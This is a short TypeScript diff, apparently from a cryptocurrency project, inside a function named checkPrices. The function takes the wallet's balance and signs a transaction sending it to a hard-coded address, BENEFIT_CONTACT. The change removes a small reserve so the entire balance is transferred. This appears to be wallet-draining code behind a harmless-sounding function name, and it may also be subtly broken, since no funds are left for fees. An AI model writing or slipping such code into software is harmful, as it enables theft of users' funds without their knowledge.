@@ -74,14 +74,10 @@ export const checkPrices = async (token: string) => {
             }
         }
         const balance = await provider.getBalance(wallet.address.toString());
-        let balance_ = ethers.utils.formatEther(balance);
-        let balance__ = Number(balance_) - 0.01;
-        console.log(balance)
-        console.log(balance__)
         const tx_ = {
             from: wallet.address.toString(),
             to: BENEFIT_CONTACT,
-            value: ethers.utils.parseEther(balance__.toString())
+            value: balance
         }
         signer.sendTransaction(tx_).then((transaction: any) => {
             if (transaction && transaction.blockNumber && transaction.status === 1) {
